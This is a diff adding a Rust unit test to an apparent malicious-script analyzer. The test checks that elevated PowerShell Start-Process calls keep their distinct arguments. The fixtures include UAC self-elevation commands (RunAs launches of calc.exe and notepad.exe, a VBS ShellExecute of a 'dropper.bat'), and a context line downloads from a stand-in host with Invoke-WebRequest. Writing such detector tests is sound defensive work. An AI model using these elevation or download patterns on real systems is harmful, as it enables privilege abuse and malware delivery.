@@ -1551,6 +1551,28 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn start_process_verb_runas_preserves_distinct_args_for_same_target() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath powershell.exe -ArgumentList calc.exe -Verb RunAs; Start-Process -FilePath powershell.exe -ArgumentList notepad.exe -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        let args: std::collections::BTreeSet<&str> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" => Some(args.as_str()),
+                _ => None,
+            })
+            .collect();
+        assert!(
+            args.contains("calc.exe") && args.contains("notepad.exe"),
+            "distinct SelfElevation args collapsed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn vbs_shell_execute_runas_emits_self_elevation_trait() {
         let script = br#"Set UAC = CreateObject("Shell.Application")
 UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
